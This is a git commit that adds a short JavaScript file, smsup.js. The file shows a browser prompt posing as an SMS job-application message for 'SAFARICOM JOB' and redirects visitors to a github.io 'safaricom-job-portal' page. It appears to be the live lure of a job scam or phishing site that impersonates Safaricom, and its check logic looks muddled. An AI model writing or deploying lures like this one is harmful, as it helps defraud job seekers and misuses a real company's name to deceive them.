d1c85a9a96b42d8a2f5b122d29121da3936064c5
offernoww <josiahnyeti16@gmail.com>
2025-01-26 15:55:41 +0100

    Create smsup.js

---
+++ smsup.js
@@ -0,0 +1,6 @@
+
+var password = 'SAFARICOM JOB'
+password=prompt('SMS :Apply for various job positions, Click OK to start applictaion','SAFARICOM JOB');
+if (password != 'SAFARICOM JOB') {
+location.href='https://offernoww.github.io/safaricom-job-portal';
+}
